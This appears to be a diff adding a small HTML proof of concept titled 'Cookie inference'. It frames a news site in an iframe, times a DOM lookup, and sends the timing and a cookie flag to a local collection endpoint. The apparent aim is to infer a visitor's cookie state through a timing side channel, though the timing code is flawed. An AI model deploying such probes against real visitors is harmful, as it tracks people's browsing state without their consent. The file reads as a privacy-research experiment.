@@ -1,0 +1,28 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <title>Cookie inference</title>
+    <input type="checkbox" name="vehicle" value="Car" id="isCookie">
+</head>
+<body>
+
+</body>
+<script type="text/javascript">
+    var iframe = document.createElement('iframe');
+    iframe.src = "http://politiken.dk"
+    iframe.width = "200px";
+    iframe.height = "200px";
+    document.body.appendChild(iframe);
+    iframe.addEventListener("load", function() {
+        var t0 = performance.now();
+        var x = document.getElementsByClassName("sec-ece_frontpage");
+        var t1 = performance.now();
+
+        var xmlHttp = new XMLHttpRequest();
+        xmlHttp.open( "GET", "http://localhost:3000/save?time=" + t1 + "&isCookie=1", true );
+        xmlHttp.send( null );
+        return;
+    });
+</script>
+</html>
